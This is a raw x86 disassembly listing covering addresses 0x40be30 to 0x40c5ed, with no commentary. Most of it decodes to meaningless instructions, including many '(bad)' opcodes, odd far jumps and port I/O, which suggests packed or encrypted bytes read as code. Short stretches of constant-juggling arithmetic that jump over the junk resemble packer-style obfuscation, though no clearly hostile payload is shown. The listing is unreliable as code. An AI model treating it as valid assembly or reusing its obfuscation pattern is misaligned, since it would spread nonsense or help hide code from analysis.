  40be30:	cld    
  40be31:	das    
  40be32:	nop
  40be33:	xor    dh,ch
  40be35:	jmp    0x40bdff
  40be37:	or     eax,0x3bc94970
  40be3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be3d:	sbb    eax,0xd9c16d51
  40be42:	arpl   WORD PTR [esi+0x36],di
  40be45:	sub    bh,BYTE PTR [ecx+0x1a]
  40be48:	xor    eax,0xbe220b81
  40be4d:	lahf   
  40be4e:	inc    ebp
  40be4f:	(bad)  
  40be50:	out    0xd5,al
  40be52:	mul    BYTE PTR ds:0x97953423
  40be58:	pop    esp
  40be59:	pop    edi
  40be5a:	mov    dl,0x9b
  40be5c:	cmp    al,0x1d
  40be5e:	add    al,0x3a
  40be60:	xlat   BYTE PTR ds:[ebx]
  40be61:	mov    al,ds:0xf7e725ff
  40be66:	jnp    0x40becd
  40be68:	and    BYTE PTR [edi-0x6e9131ac],bh
  40be6e:	xor    eax,0xf9cc639c
  40be73:	xlat   BYTE PTR ds:[ebx]
  40be74:	push   cs
  40be75:	test   DWORD PTR [edx-0x67266527],0xf41ee9df
  40be7f:	and    DWORD PTR [edi+edx*1-0x1c448d6c],edx
  40be86:	mov    DWORD PTR [edi+0x7],esp
  40be89:	div    DWORD PTR [edx+0x5d]
  40be8c:	pop    edi
  40be8d:	add    DWORD PTR [ecx],0x571826e4
  40be93:	test   al,0x91
  40be95:	inc    ecx
  40be96:	scas   al,BYTE PTR es:[edi]
  40be97:	and    al,0xa3
  40be99:	and    ah,BYTE PTR [ebp+0x7c]
  40be9c:	es loope 0x40be61
  40be9f:	js     0x40bf11
  40bea1:	inc    ebx
  40bea2:	dec    esp
  40bea3:	push   ss
  40bea4:	cdq    
  40bea5:	mov    al,ds:0xc7e81ac5
  40beaa:	lahf   
  40beab:	dec    eax
  40beac:	fild   QWORD PTR [ecx+esi*4+0x4b60db5b]
  40beb3:	and    BYTE PTR [esi-0x7ed252c0],ch
  40beb9:	mov    ?,WORD PTR [edi-0x2d]
  40bebc:	fidiv  WORD PTR [edi-0x749ff45]
  40bec2:	xchg   edx,eax
  40bec3:	cmp    ebx,edi
  40bec5:	loop   0x40be5f
  40bec7:	cdq    
  40bec8:	leave  
  40bec9:	cmp    eax,0x44d0913e
  40bece:	dec    edi
  40becf:	loop   0x40be97
  40bed1:	es sub al,0x93
  40bed4:	push   ebp
  40bed5:	test   BYTE PTR [edi-0x588770f9],bl
  40bedb:	bound  edi,QWORD PTR [esp+edi*1]
  40bede:	int    0x6e
  40bee0:	push   0x61
  40bee2:	out    dx,eax
  40bee3:	xchg   esp,eax
  40bee4:	(bad)  
  40bee5:	jge    0x40be90
  40bee7:	icebp  
  40bee8:	int    0x22
  40beea:	aad    0x11
  40beec:	adc    BYTE PTR [si+0x13],0x36
  40bef1:	nop
  40bef2:	mov    bh,0x27
  40bef4:	add    edi,DWORD PTR [eax-0x45f07e5]
  40befa:	pop    es
  40befb:	hlt    
  40befc:	and    eax,0x4f6835bc
  40bf01:	pop    ebp
  40bf02:	call   0x9aa3742c
  40bf07:	mov    DWORD PTR [ebp-0x4],0x7584
  40bf0e:	mov    DWORD PTR [ebp-0x8],0x7c9f
  40bf15:	mov    eax,DWORD PTR [ebp-0x8]
  40bf18:	xor    edx,edx
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi+0x62a7ca90],1
  40bf66:	sahf   
  40bf67:	inc    edx
  40bf68:	(bad)  
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0x895b5328
  40bf73:	or     eax,0x31e4acb
  40bf78:	push   ebx
  40bf79:	mov    al,0x23
  40bf7b:	je     0x40bf3f
  40bf7d:	(bad)  [eax-0xf]
  40bf80:	pop    es
  40bf81:	mov    edi,0x55618b76
  40bf86:	enter  0x29f8,0xe9
  40bf8a:	sub    al,ah
  40bf8c:	aad    0xc0
  40bf8e:	and    BYTE PTR [ebx-0x7a],dl
  40bf91:	test   al,0x8
  40bf93:	out    dx,eax
  40bf94:	cli    
  40bf95:	cs add eax,0x60e2fb29
  40bf9b:	xor    DWORD PTR [ecx+ebx*4],ebx
  40bf9e:	jmp    0x4ee0:0x4c990c41
  40bfa5:	pop    esi
  40bfa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfa7:	sbb    al,0x16
  40bfa9:	imul   esi,DWORD PTR [ebx+ecx*2],0xcaf38e5b
  40bfb0:	cmp    dl,ch
  40bfb2:	and    eax,DWORD PTR [edx+0x2492529d]
  40bfb8:	ins    DWORD PTR es:[edi],dx
  40bfb9:	inc    edx
  40bfba:	gs pop edi
  40bfbc:	mov    cl,0x49
  40bfbe:	xor    eax,0xaf8df7e8
  40bfc3:	jmp    0xe994750a
  40bfc8:	or     ecx,eax
  40bfca:	dec    eax
  40bfcb:	(bad)  
  40bfcc:	fldenv [esi-0x618926d5]
  40bfd2:	aam    0x3c
  40bfd4:	mov    esi,0xd10ea444
  40bfd9:	sbb    al,0x35
  40bfdb:	inc    DWORD PTR [edx]
  40bfdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfde:	loope  0x40bf95
  40bfe0:	jmp    0x40c00f
  40bfe2:	inc    ecx
  40bfe3:	add    eax,0xaf62f342
  40bfe8:	push   0xffffffe6
  40bfea:	daa    
  40bfeb:	(bad)  
  40bfec:	popf   
  40bfed:	add    DWORD PTR [ebp+ecx*1+0x58],ebp
  40bff1:	aam    0x0
  40bff3:	xor    BYTE PTR [esi-0x4edc4f61],bl
  40bff9:	int    0x7
  40bffb:	jg     0x40bfbe
  40bffd:	int    0xc5
  40bfff:	sub    eax,0xb88f53a1
  40c004:	mov    edx,0xccad05d2
  40c009:	or     DWORD PTR [edx-0x6af1e0a7],esp
  40c00f:	pop    ds
  40c010:	xor    al,0x34
  40c012:	sbb    BYTE PTR [edi],bh
  40c014:	lock shl BYTE PTR [ebx-0x1489a15f],1
  40c01b:	xor    dh,BYTE PTR [edx+0x10]
  40c01e:	sub    bh,BYTE PTR [eax]
  40c020:	fbld   TBYTE PTR [eax]
  40c022:	das    
  40c023:	aas    
  40c024:	(bad)  
  40c025:	push   ss
  40c026:	push   eax
  40c027:	cdq    
  40c028:	inc    ebx
  40c029:	or     edi,ebp
  40c02b:	enter  0xccd7,0xf1
  40c02f:	cmp    al,0xd6
  40c031:	adc    dl,BYTE PTR ds:0xdf8a3c89
  40c037:	ret    
  40c038:	jae    0x40bfbc
  40c03a:	mov    eax,ds:0x1e2dea93
  40c03f:	xlat   BYTE PTR ds:[ebx]
  40c040:	pop    ebp
  40c041:	jno    0x40bfee
  40c043:	jp     0x40c03a
  40c045:	sub    DWORD PTR [esi+0xa],esi
  40c048:	xlat   BYTE PTR ds:[ebx]
  40c049:	addr16 pop es
  40c04b:	sub    eax,0x3ebc0aa2
  40c050:	in     eax,0xc9
  40c052:	pop    ecx
  40c053:	iret   
  40c054:	retf   
  40c055:	push   esp
  40c056:	(bad)  
  40c057:	stc    
  40c058:	je     0x40c0b1
  40c05a:	mov    dl,0x7b
  40c05c:	mov    edx,0xfdf5e050
  40c061:	cmp    al,0xb
  40c063:	in     eax,dx
  40c064:	imul   esi,ebx,0xbc0d51bb
  40c06a:	ss push 0xffffffcf
  40c06d:	dec    esi
  40c06e:	sub    al,0x5f
  40c070:	sbb    eax,0xebaa3a16
  40c075:	mov    WORD PTR [eax],ss
  40c077:	push   esp
  40c078:	jne    0x40c0bb
  40c07a:	retf   
  40c07b:	jge    0x40c009
  40c07d:	mov    WORD PTR [ebp+ebx*1+0x2f080ab4],ds
  40c084:	and    eax,0x8366b867
  40c089:	or     al,0x63
  40c08b:	ins    DWORD PTR es:[edi],dx
  40c08c:	in     al,dx
  40c08d:	int3   
  40c08e:	test   DWORD PTR [edi+0x2f],ebx
  40c091:	cdq    
  40c092:	ins    DWORD PTR es:[edi],dx
  40c093:	jae    0x40c0bd
  40c095:	sbb    ebp,eax
  40c097:	inc    esp
  40c098:	push   cs
  40c099:	stos   BYTE PTR es:[edi],al
  40c09a:	pop    ss
  40c09b:	xor    esp,DWORD PTR [eax+0x49]
  40c09e:	and    eax,0xa202ae49
  40c0a3:	mov    ebp,0xa3fd2874
  40c0a8:	xor    edx,ebx
  40c0aa:	nop
  40c0ab:	in     al,dx
  40c0ac:	pop    esi
  40c0ad:	in     al,0xcc
  40c0af:	test   DWORD PTR [esi-0x4110df7d],ebp
  40c0b5:	mov    bh,0x47
  40c0b7:	popf   
  40c0b8:	push   edi
  40c0b9:	mov    cl,0x46
  40c0bb:	test   DWORD PTR ds:0x62974acb,ebx
  40c0c1:	loop   0x40c110
  40c0c3:	hlt    
  40c0c4:	mov    ecx,0xad745228
  40c0c9:	test   DWORD PTR [ebx+0x1b],0x665932b3
  40c0d0:	xchg   ebp,ebp
  40c0d2:	inc    esp
  40c0d3:	call   0xb12c:0xe99a6f99
  40c0da:	sbb    eax,0xed1e9d1c
  40c0df:	je     0x40c08c
  40c0e1:	inc    eax
  40c0e2:	push   edx
  40c0e3:	jge    0x40c0bf
  40c0e5:	mov    eax,ds:0xa208b433
  40c0ea:	mov    bl,0x56
  40c0ec:	xchg   edx,eax
  40c0ed:	neg    DWORD PTR [ecx]
  40c0ef:	xlat   BYTE PTR ds:[ebx]
  40c0f0:	or     ebp,DWORD PTR [ecx-0x10bd096e]
  40c0f6:	inc    edi
  40c0f7:	xor    eax,0x108b4d5
  40c0fc:	inc    edx
  40c0fd:	cmp    eax,DWORD PTR [edi+0x22]
  40c100:	cmp    DWORD PTR [ebp-0xafa7382],ebp
  40c106:	imul   esi,DWORD PTR [ebp+0x3],0xffffff80
  40c10a:	ins    DWORD PTR es:[edi],dx
  40c10b:	test   eax,0xd0f43b90
  40c110:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c111:	jno    0x40c099
  40c113:	cmp    cl,BYTE PTR [ecx-0x4e7dc7e3]
  40c119:	jo     0x40c163
  40c11b:	sub    eax,DWORD PTR [edi+0x4cf6a35]
  40c121:	js     0x40c0cf
  40c123:	icebp  
  40c124:	xchg   esi,eax
  40c125:	sbb    al,0xbe
  40c127:	mov    al,0x14
  40c129:	adc    eax,0xa9aad6a8
  40c12e:	add    al,0x75
  40c130:	sbb    al,0xe5
  40c132:	sub    al,0x3e
  40c134:	loop   0x40c0fd
  40c136:	bound  eax,QWORD PTR [esi+0x7ab14faa]
  40c13c:	add    cl,BYTE PTR [ebx-0x1f2cecb9]
  40c142:	sub    eax,0xf08f40f7
  40c147:	mov    cl,0x4f
  40c149:	push   ecx
  40c14a:	loope  0x40c198
  40c14c:	lahf   
  40c14d:	pop    ecx
  40c14e:	jp     0x40c14f
  40c150:	stos   DWORD PTR es:[edi],eax
  40c151:	sbb    BYTE PTR [ebx+ecx*8+0x12052165],dh
  40c158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c159:	jno    0x40c15e
  40c15b:	call   0x36b0:0xb5451059
  40c162:	dec    DWORD PTR [ebx+eiz*1]
  40c165:	icebp  
  40c166:	cmp    dl,BYTE PTR [ebp+0x314f1ee5]
  40c16c:	xor    eax,eax
  40c16e:	pop    eax
  40c16f:	rol    DWORD PTR [ecx],cl
  40c171:	pop    edi
  40c172:	scas   al,BYTE PTR es:[edi]
  40c173:	adc    DWORD PTR [ebp-0x12375d31],ebx
  40c179:	mov    cl,0x7a
  40c17b:	xor    BYTE PTR [ecx-0x38402821],ch
  40c181:	sbb    eax,0xc220cd0b
  40c186:	push   cs
  40c187:	mov    dh,0x3e
  40c189:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c18a:	push   ss
  40c18b:	std    
  40c18c:	(bad)  
  40c18e:	jecxz  0x40c11c
  40c190:	dec    esi
  40c191:	cmc    
  40c192:	pop    edi
  40c193:	mov    ecx,0xebc40135
  40c198:	add    bh,dh
  40c19a:	aas    
  40c19b:	fcom   QWORD PTR ds:0x646eee44
  40c1a1:	ret    0x58dc
  40c1a4:	(bad)  
  40c1a5:	mov    dh,BYTE PTR [esi]
  40c1a7:	daa    
  40c1a8:	pop    ss
  40c1a9:	pop    edx
  40c1aa:	jp     0x40c1fd
  40c1ac:	(bad)  
  40c1ad:	fucom  st(4)
  40c1af:	cwde   
  40c1b0:	jp     0x40c153
  40c1b2:	pusha  
  40c1b3:	fs inc ebx
  40c1b5:	sub    al,0xb5
  40c1b7:	test   al,0x3
  40c1b9:	jae    0x40c1da
  40c1bb:	ret    0x1a2
  40c1be:	push   0xffffff85
  40c1c0:	cli    
  40c1c1:	fs je  0x40c1d3
  40c1c4:	sti    
  40c1c5:	lea    ecx,[ecx-0x4f]
  40c1c8:	mov    edi,0x85079818
  40c1cd:	adc    BYTE PTR [edx+0x69ac234f],bh
  40c1d3:	pop    edx
  40c1d4:	and    al,0x2c
  40c1d6:	cmp    al,BYTE PTR [eax]
  40c1d8:	pop    edi
  40c1d9:	imul   ah
  40c1db:	pop    edi
  40c1dc:	mov    WORD PTR [edx],ds
  40c1de:	mov    ch,0x14
  40c1e0:	mov    al,ds:0xd0dbd47b
  40c1e5:	and    al,0x71
  40c1e7:	jns    0x40c190
  40c1e9:	lahf   
  40c1ea:	rcl    DWORD PTR [ecx],0x2c
  40c1ed:	add    edi,DWORD PTR [ecx+0x3bd4e676]
  40c1f3:	cmp    BYTE PTR [esi+eiz*2-0x28],dh
  40c1f7:	cmc    
  40c1f8:	mov    WORD PTR [edx-0x72],?
  40c1fb:	sbb    esp,DWORD PTR [edx]
  40c1fd:	iret   
  40c1fe:	jecxz  0x40c21d
  40c200:	imul   eax,DWORD PTR [ecx],0x13
  40c203:	imul   esi,DWORD PTR [ebx],0x9cf2fe45
  40c209:	sub    al,0xc5
  40c20b:	sub    edi,ebp
  40c20d:	xchg   ebp,eax
  40c20e:	rcr    BYTE PTR [ecx],cl
  40c210:	push   esi
  40c211:	ficomp DWORD PTR [ecx]
  40c213:	xor    eax,DWORD PTR [ebp-0x4cb80b9f]
  40c219:	daa    
  40c21a:	xlat   BYTE PTR ds:[ebx]
  40c21b:	mov    al,ds:0x84fcd438
  40c220:	loopne 0x40c1db
  40c222:	arpl   di,ax
  40c224:	fisttp QWORD PTR [edi+0x14a97329]
  40c22a:	js     0x40c2ab
  40c22c:	imul   DWORD PTR [eax-0x16]
  40c22f:	clc    
  40c230:	fiadd  DWORD PTR [edi-0x38d1407b]
  40c236:	cld    
  40c237:	xor    BYTE PTR [edx],dh
  40c239:	inc    ebp
  40c23a:	pushf  
  40c23b:	dec    esp
  40c23c:	dec    ecx
  40c23d:	jne    0x40c245
  40c23f:	(bad)  
  40c240:	(bad)  [edx+0x5e5e7031]
  40c246:	add    DWORD PTR [edi-0x104cb52f],0x25
  40c24d:	xor    DWORD PTR [ebx],esp
  40c24f:	dec    esp
  40c250:	xchg   ah,al
  40c252:	xlat   BYTE PTR ds:[ebx]
  40c253:	ins    BYTE PTR es:[edi],dx
  40c254:	test   al,0x2f
  40c256:	xchg   ebp,eax
  40c257:	xchg   ebx,eax
  40c258:	and    eax,0xc8bfbda8
  40c25d:	cld    
  40c25e:	adc    DWORD PTR [edx-0x77],esi
  40c261:	cld    
  40c262:	je     0x40c27a
  40c264:	pusha  
  40c265:	stos   DWORD PTR es:[edi],eax
  40c266:	call   0x3671:0x245a3e6b
  40c26d:	inc    eax
  40c26e:	and    BYTE PTR [eax-0x98911b3],0x65
  40c275:	adc    BYTE PTR [eax+esi*1-0x41],ch
  40c279:	dec    ecx
  40c27a:	xchg   ebx,eax
  40c27b:	int3   
  40c27c:	sbb    edx,DWORD PTR [eax-0x15]
  40c27f:	cmc    
  40c280:	ja     0x40c2eb
  40c282:	fcom   DWORD PTR [esi+0x50]
  40c285:	loopne 0x40c268
  40c287:	mov    edi,DWORD PTR [eax+0xea28609]
  40c28d:	retf   
  40c28e:	xor    al,0x95
  40c290:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c291:	imul   esi,DWORD PTR [edx],0x0
  40c294:	scas   eax,DWORD PTR es:[edi]
  40c295:	cmp    eax,edi
  40c297:	mov    cl,0xed
  40c299:	sahf   
  40c29a:	jb     0x40c228
  40c29c:	sbb    eax,0xa6c87923
  40c2a1:	ja     0x40c227
  40c2a3:	xchg   DWORD PTR [ecx],edx
  40c2a5:	push   0x72
  40c2a7:	leave  
  40c2a8:	inc    edi
  40c2a9:	rcl    BYTE PTR [eax],cl
  40c2ab:	and    ecx,DWORD PTR [ebp+0xa]
  40c2ae:	sbb    edi,DWORD PTR [esi-0x71]
  40c2b1:	(bad)  
  40c2b2:	(bad)  
  40c2b3:	shl    DWORD PTR [eax+0x965b2a0],1
  40c2b9:	sub    ebx,DWORD PTR [esi+0x57fb3052]
  40c2bf:	add    ch,BYTE PTR [ebx+0x4b2823ca]
  40c2c5:	jecxz  0x40c2de
  40c2c7:	scas   eax,DWORD PTR es:[edi]
  40c2c8:	jns    0x40c339
  40c2ca:	bound  esi,QWORD PTR [edx-0x4d2563bb]
  40c2d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2d1:	jno    0x40c30e
  40c2d3:	(bad)  
  40c2d4:	xchg   edi,eax
  40c2d5:	mov    edx,0x3c6a0b6f
  40c2da:	ins    DWORD PTR es:[edi],dx
  40c2db:	cmp    ah,bh
  40c2dd:	mov    ds:0x282c0685,al
  40c2e2:	nop
  40c2e3:	inc    edx
  40c2e4:	push   0x5ca313b4
  40c2e9:	(bad)  
  40c2ea:	cli    
  40c2eb:	ret    
  40c2ec:	xchg   edx,eax
  40c2ed:	dec    edx
  40c2ee:	out    0x68,al
  40c2f0:	jno    0x40c34f
  40c2f2:	jo     0x40c353
  40c2f4:	fstp   DWORD PTR [ebx]
  40c2f6:	cmp    BYTE PTR [ecx-0x10],0x8c
  40c2fa:	xor    esp,DWORD PTR es:[edi-0x2f7be026]
  40c301:	and    ecx,DWORD PTR [ecx-0x73]
  40c304:	cld    
  40c305:	or     cl,BYTE PTR [eax+0x33]
  40c308:	retf   
  40c309:	imul   eax,DWORD PTR [ecx+0x52f74388],0x2d
  40c310:	sahf   
  40c311:	jb     0x40c330
  40c313:	jmp    0x76a9:0xe7899332
  40c31a:	data16 cmp al,BYTE PTR [esi]
  40c31d:	xchg   ebp,eax
  40c31e:	scas   al,BYTE PTR es:[edi]
  40c31f:	add    DWORD PTR [ebp-0x609d8e26],esi
  40c325:	adc    BYTE PTR [ecx],al
  40c327:	pop    ss
  40c328:	push   ebx
  40c329:	adc    ebp,esp
  40c32b:	add    BYTE PTR [eax+0x4e6a19ae],al
  40c331:	lods   eax,DWORD PTR ds:[esi]
  40c332:	jge    0x40c2d8
  40c334:	outs   dx,DWORD PTR ds:[esi]
  40c335:	mov    bh,0xf2
  40c337:	ins    DWORD PTR es:[edi],dx
  40c338:	hlt    
  40c339:	jne    0x40c2db
  40c33b:	out    dx,eax
  40c33c:	mov    eax,DWORD PTR [edi-0x53]
  40c33f:	ret    0xe9d4
  40c342:	dec    ebp
  40c343:	lock stos BYTE PTR es:[edi],al
  40c345:	(bad)  
  40c346:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c347:	cmp    DWORD PTR [edi],ecx
  40c349:	ret    
  40c34a:	out    0x26,al
  40c34c:	fnstcw WORD PTR ds:0xcb370f6e
  40c352:	jnp    0x40c332
  40c354:	stc    
  40c355:	mov    eax,0xaa701048
  40c35a:	das    
  40c35b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c35c:	loope  0x40c2eb
  40c35e:	test   BYTE PTR [ecx],al
  40c360:	adc    al,0x9a
  40c362:	(bad)  
  40c363:	(bad)  
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi+0x2ad2aecf],ebp
  40c476:	rcl    DWORD PTR [esi],1
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0xdb7a2655
  40c483:	aam    0x7b
  40c485:	outs   dx,BYTE PTR ds:[esi]
  40c486:	inc    DWORD PTR [ebx+ebx*1]
  40c489:	cmc    
  40c48a:	imul   eax
  40c48c:	in     al,0xe1
  40c48e:	xchg   ebp,eax
  40c48f:	ins    DWORD PTR es:[edi],dx
  40c490:	mov    DWORD PTR [eax],ebx
  40c492:	pop    ss
  40c493:	out    dx,eax
  40c494:	call   0x3cca690
  40c499:	mov    ecx,0xf437081f
  40c49e:	pusha  
  40c49f:	in     al,0x5a
  40c4a1:	pop    ss
  40c4a2:	sub    BYTE PTR [eax+0x524e6bb2],dh
  40c4a8:	mov    cl,0xc1
  40c4aa:	and    eax,0xee0c9e9a
  40c4af:	test   eax,0xf0c6dbe3
  40c4b4:	jmp    0x6dbc:0x8a307b65
  40c4bb:	in     al,0x33
  40c4bd:	icebp  
  40c4be:	jae    0x40c44c
  40c4c0:	je     0x40c4dc
  40c4c2:	sbb    DWORD PTR [ebx+0x1be0ff32],edx
  40c4c8:	or     bh,BYTE PTR [esi-0x7e]
  40c4cb:	shl    edi,1
  40c4cd:	out    dx,eax
  40c4ce:	ficom  DWORD PTR [ebx+0x3c]
  40c4d1:	inc    ecx
  40c4d2:	add    al,0x7c
  40c4d4:	outs   dx,DWORD PTR ds:[esi]
  40c4d5:	lds    ecx,FWORD PTR [edx]
  40c4d7:	fucomip st,st(3)
  40c4d9:	(bad)  
  40c4db:	lods   eax,DWORD PTR ds:[esi]
  40c4dc:	sti    
  40c4dd:	mov    eax,0x76182607
  40c4e2:	xchg   esi,eax
  40c4e3:	ja     0x40c491
  40c4e5:	mov    al,ds:0x8cbf4074
  40c4ea:	pop    esi
  40c4eb:	vpsraw xmm2,xmm2,XMMWORD PTR [esi]
  40c4ef:	mov    ds:0xc2cad48f,eax
  40c4f4:	mov    ds:0xcb59d000,eax
  40c4f9:	jp     0x40c498
  40c4fb:	adc    DWORD PTR [ebx+0x64],edx
  40c4fe:	mov    ds:0xcddbc187,eax
  40c503:	xchg   BYTE PTR [ebx+0x29],dl
  40c506:	outs   dx,DWORD PTR ds:[esi]
  40c507:	stc    
  40c508:	inc    ebp
  40c509:	add    eax,0x6aafe5a9
  40c50e:	and    esp,ebp
  40c510:	mov    dh,0x6
  40c512:	inc    eax
  40c513:	add    BYTE PTR [ecx],dl
  40c515:	push   eax
  40c516:	enter  0xb7b7,0x7e
  40c51a:	das    
  40c51b:	adc    ecx,DWORD PTR [edx+esi*8]
  40c51e:	cmp    al,0x1
  40c520:	xor    DWORD PTR [edi-0x5c],edi
  40c523:	mov    ebp,0x4c1f29bb
  40c528:	fwait
  40c529:	outs   dx,DWORD PTR ds:[esi]
  40c52a:	gs in  eax,0xd4
  40c52d:	cmp    DWORD PTR [esi-0x4c],eax
  40c530:	gs xchg esi,eax
  40c532:	inc    ecx
  40c533:	stos   DWORD PTR es:[edi],eax
  40c534:	lods   al,BYTE PTR ds:[esi]
  40c535:	adc    esp,DWORD PTR [edx+edx*4]
  40c538:	aad    0xcc
  40c53a:	sub    DWORD PTR [eax+0x1cad0ed0],0xfffffff2
  40c541:	pop    edx
  40c542:	jbe    0x40c506
  40c544:	sbb    al,dh
  40c546:	shr    BYTE PTR ds:0xcc244392,0x2f
  40c54d:	repz out 0x23,eax
  40c550:	fdiv   DWORD PTR [edx*2+0x141ff36a]
  40c557:	jp     0x40c4e2
  40c559:	jns    0x40c55d
  40c55b:	mov    ds:0xd027c17f,al
  40c560:	inc    edi
  40c561:	arpl   WORD PTR [ebx-0xa],bx
  40c564:	(bad)  
  40c565:	or     eax,DWORD PTR [ecx]
  40c567:	aam    0x7e
  40c569:	xchg   bh,bh
  40c56b:	test   eax,0x8db76aa3
  40c570:	add    al,0xda
  40c572:	lea    ebp,[eax+0x79642a3]
  40c578:	sbb    DWORD PTR [eax-0x15],ebp
  40c57b:	mov    ah,0xfb
  40c57d:	rcl    DWORD PTR [esi+edi*8],0x9e
  40c581:	pusha  
  40c582:	in     al,dx
  40c583:	and    DWORD PTR [ebp+ebx*2-0x6],0x31
  40c588:	ret    
  40c589:	lock fcomp DWORD PTR [ebx]
  40c58c:	rol    BYTE PTR [ebx+0x69af3e3e],1
  40c592:	push   esp
  40c593:	les    eax,FWORD PTR [esi]
  40c595:	mov    DWORD PTR [edx-0x52],eax
  40c598:	mov    ah,0x45
  40c59a:	and    ecx,DWORD PTR [edx]
  40c59c:	push   ds
  40c59d:	fsub   DWORD PTR [ebx+ebp*2+0x7532d3b4]
  40c5a4:	stc    
  40c5a5:	out    0x9b,al
  40c5a7:	pop    ecx
  40c5a8:	dec    esi
  40c5a9:	jg     0x40c5c6
  40c5ab:	in     eax,0x63
  40c5ad:	pop    eax
  40c5af:	fsubr  DWORD PTR [ebx+0x63]
  40c5b2:	das    
  40c5b3:	repnz stos BYTE PTR es:[edi],al
  40c5b5:	adc    ah,bh
  40c5b7:	xchg   edi,eax
  40c5b8:	xor    eax,0x74898e15
  40c5bd:	nop
  40c5be:	neg    BYTE PTR [ebx+ebx*4]
  40c5c1:	mov    DWORD PTR [esi-0x48],edi
  40c5c4:	int    0xc2
  40c5c6:	lods   eax,DWORD PTR ds:[esi]
  40c5c7:	jns    0x40c59a
  40c5c9:	bound  eax,QWORD PTR ds:0x93693323
  40c5cf:	dec    edi
  40c5d0:	push   0x31260d72
  40c5d5:	shl    al,1
  40c5d7:	dec    ebp
  40c5d8:	outs   dx,BYTE PTR ds:[esi]
  40c5d9:	mov    ah,0x95
  40c5db:	pop    ds
  40c5dc:	and    DWORD PTR [edi-0x70f347bc],ecx
  40c5e2:	push   edi
  40c5e3:	test   al,0xaa
  40c5e5:	and    eax,esi
  40c5e7:	aaa    
  40c5e8:	mov    ebp,0xb4b74af6
  40c5ed:	pop    ecx
